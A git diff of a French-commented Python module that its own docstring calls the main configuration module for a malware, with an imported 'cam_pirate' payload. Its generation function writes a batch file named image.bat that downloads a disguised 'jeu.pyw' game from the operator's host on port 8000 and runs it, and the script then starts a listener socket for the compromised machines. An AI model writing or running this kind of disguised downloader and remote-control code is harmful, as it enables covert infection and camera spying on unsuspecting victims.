@@ -1,6 +1,17 @@
+"""
+Author: Martin Calamel
+Created: 2025-02-26
+Description: module principal pour le configurer le malware
+TODO: réorganiser le code
+      mettre en place les bonnes pratiques
+"""
+
+
+# importation des modules
 import socket, sys,time,os,threading,csv
 import payload.cam_pirate as cam
 from colorama import Fore,deinit,init
+from modules.fonctions import get_ip, generation_vecteur, menu
 
 def generation(HOST):
     os.system("del payload/image.bat")
@@ -10,20 +21,24 @@ def generation(HOST):
     msg+=HOST+":8000/payload/jeu.pyw -o jeu.py\npython jeu.py"
     fich.write(msg)
     fich.close()
+
+def ip():
+    donnees=[]
+    while donnees==[]:
+        fich=open('message.txt','r')
+        c=csv.reader(fich,delimiter=';')
+        donnees=[]
+        for ligne in c:
+            donnees.append(ligne)
+        fich.close
+    return(donnees[0][0])
+
 init()
-print()
-print(Fore.RED)
-print("███████         ███████ ██ ██████  ███████ ████████ \n   ███          ██      ██ ██   ██ ██         ██    \n  ███           █████   ██ ██████  ███████    ██    \n ███            ██      ██ ██   ██      ██    ██    \n███████ ███████ ██      ██ ██   ██ ███████    ██    \n",Fore.WHITE)
-print()
-print(Fore.GREEN,"              coded By macalamel",Fore.BLUE)
-print()
-try:
-    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    s.connect(("8.8.8.8", 80))
-    HOST=s.getsockname()[0]
-    s.close()
-except:
-    HOST="192.168.56.1"
+menu()
+
+
+HOST = get_ip()
+
 fich=open('selfIp.txt','w')
 fich.write(HOST)
 fich.close()
@@ -42,19 +57,10 @@ if a=="1":
         print("error server")
         sys.exit()
     print("generation du payload...")
-    generation(HOST)
+    generation_vecteur(HOST)
     print("payload enregistré sous le nom image.bat")
 
-def ip():
-    donnees=[]
-    while donnees==[]:
-        fich=open('message.txt','r')
-        c=csv.reader(fich,delimiter=';')
-        donnees=[]
-        for ligne in c:
-            donnees.append(ligne)
-        fich.close
-    return(donnees[0][0])
+
 
 print("démarage de l'ecoute")
 mySocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
